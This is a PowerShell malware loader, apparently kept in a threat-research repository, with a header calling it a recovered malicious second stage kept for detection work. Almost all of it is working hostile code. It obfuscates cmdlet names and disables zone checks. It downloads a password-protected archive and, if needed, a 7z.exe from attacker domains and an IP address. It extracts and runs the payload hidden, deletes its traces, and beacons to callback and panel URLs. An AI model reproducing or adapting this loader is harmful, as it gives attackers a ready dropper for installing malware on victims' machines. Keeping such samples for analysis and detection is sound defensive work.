<#
    ============================================================
    !!! MALICIOUS SCRIPT - DO NOT EXECUTE !!!
    Recovered as-is from dragonphoenixstar.cfd/1YLO2qTafmdBm3CqwH
    (the URL that stage1_loader.ps1 fetches and loads as a module)
    Kept for research / detection-engineering purposes only.
    See ../analysis/01-initial-access.md for full context.
    ============================================================
#>

$DSfyHa = [Guid]::NewGuid().ToString('N')
$cPoCYg = ($DSfyHa.Length -bxor 0xEC)
$njsODe = [Math]::Abs($cPoCYg % 8191)
$ErrorActionPreference = ('Sil' + 'entlyCont' + 'inue')
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$ErrorActionPreference = ('Sil'+'entlyCont'+'inue')
$ProgressPreference = ('Sil'+'entlyCont'+'inue')
$env:SEE_MASK_NOZONECHECKS = 1
[Net.ServicePointManager]::SecurityProtocol = 3072

function FetchSTHAS {
    param($url, $path, $need, [switch]$Pe)
    $retry = 0
    while ($retry -lt 2) {
        try {
            $wc = New-Object ('Net.'+'WebClient')
            $wc.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) WindowsPowerShell/5.1')
            $wc.Headers.Add('X-Panel-Internal', '1')
            $wc.('Down'+'loadFile')($url, $path)
            if ((Test-Path $path) -and ((Get-Item $path).Length -ge $need)) {
                $sig = [IO.File]::ReadAllBytes($path)
                $ok = $false
                if ($Pe) {
                    if ($sig.Length -ge 2 -and $sig[0] -eq 0x4D -and $sig[1] -eq 0x5A) { $ok = $true }
                } else {
                    if ($sig.Length -ge 2 -and $sig[0] -eq 0x37 -and $sig[1] -eq 0x7A) { $ok = $true }
                }
                if ($ok) { return $true }
                Remove-Item $path -Force -EA 0
            }
        } catch {
            try {
                & ('Inv'+'oke-Web'+'Request') -Uri $url -OutFile $path -UseBasicParsing -Headers @{'User-Agent'='Mozilla/5.0 (Windows NT 10.0; Win64; x64) WindowsPowerShell/5.1';'X-Panel-Internal'='1'} -TimeoutSec 120
                if ((Test-Path $path) -and ((Get-Item $path).Length -ge $need)) {
                    $sig = [IO.File]::ReadAllBytes($path)
                    $ok = $false
                    if ($Pe) {
                        if ($sig.Length -ge 2 -and $sig[0] -eq 0x4D -and $sig[1] -eq 0x5A) { $ok = $true }
                    } else {
                        if ($sig.Length -ge 2 -and $sig[0] -eq 0x37 -and $sig[1] -eq 0x7A) { $ok = $true }
                    }
                    if ($ok) { return $true }
                    Remove-Item $path -Force -EA 0
                }
            } catch {}
        }
        $retry++
        & ('Start'+'-Sleep') -Milliseconds (Get-Random -Min 300 -Max 800)
    }
    return $false
}

$d = $env:TEMP
$pw = '10000'
$arc = Join-Path $d ([guid]::NewGuid().ToString('N') + '.7z')
$out = $arc + '_x'
$7z = Join-Path $d '7z.exe'

$ok = $false
foreach ($u in @(
    'https://sillygoosetoon.cfd/dl/689838.7z',
    'http://sillygoosetoon.cfd/dl/689838.7z'
)) {
    if (FetchSTHAS $u $arc 500000) { $ok = $true; break }
}
if (-not $ok) { exit }

$sys7z = @('C:\Program Files\7-Zip\7z.exe', 'C:\Program Files (x86)\7-Zip\7z.exe') | Where-Object { Test-Path $_ } | Select-Object -First 1

if (-not $sys7z) {
    $zok = $false
    foreach ($u in @(
    'http://91.92.33.156/t/7z.exe',
    'https://dragonphoenixstar.cfd/t/7z.exe',
    'http://dragonphoenixstar.cfd/t/7z.exe'
    )) {
        if (FetchSTHAS $u $7z 500000 -Pe) { $zok = $true; break }
    }
    if (-not $zok) { Remove-Item $arc -Force -EA 0; exit }
    $bin = $7z
} else {
    $bin = $sys7z
}

if (Test-Path $out) { Remove-Item $out -Recurse -Force -EA 0 }
New-Item -ItemType Directory -Path $out -Force | Out-Null

$xok = $false
try {
    & $bin x $arc "-p$pw" "-o$out" -y | Out-Null
    if ($LASTEXITCODE -eq 0) { $xok = $true }
} catch {}

if (-not $xok -and $bin -eq $7z) {
    $sys = @('C:\Program Files\7-Zip\7z.exe', 'C:\Program Files (x86)\7-Zip\7z.exe') | Where-Object { Test-Path $_ } | Select-Object -First 1
    if ($sys) {
        try {
            & $sys x $arc "-p$pw" "-o$out" -y | Out-Null
            if ($LASTEXITCODE -eq 0) { $xok = $true; $bin = $sys }
        } catch {}
    }
}

if (-not $xok) {
    if ($bin -eq $7z) { Remove-Item $7z -Force -EA 0 }
    Remove-Item $arc -Force -EA 0
    Remove-Item $out -Recurse -Force -EA 0
    exit
}

if ($bin -eq $7z) { Remove-Item $7z -Force -EA 0 }
Remove-Item $arc -Force -EA 0

$exe = Get-ChildItem -Path $out -Recurse -Filter '*.exe' -EA 0 | Select-Object -First 1
if (-not $exe) { Remove-Item $out -Recurse -Force -EA 0; exit }

try { Unblock-File -Path $exe.FullName -EA 0 } catch {}

& ('Start'+'-Process') -FilePath $exe.FullName -WorkingDirectory $exe.DirectoryName -WindowStyle ('Hid'+'den')
Set-Content (Join-Path $d 'rx_unpack.ok') '1'
& ('Start'+'-Sleep') -Milliseconds 500

try {
    $wc = New-Object ('Net.'+'WebClient')
    $wc.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) WindowsPowerShell/5.1')
    $wc.('Down'+'loadString')('http://dragonphoenixstar.cfd/dl-callback/2agdrse7-zjhtj5yt-e8bzg5pg-ana9vc6n/689838.7z/c8dabf19d44b35e4f2223b2e55acc71b') | Out-Null
} catch {}
try {
    $wc = New-Object ('Net.'+'WebClient')
    $wc.UploadString('http://91.92.33.156/panel/pb-fire', 'POST', '')
} catch {}
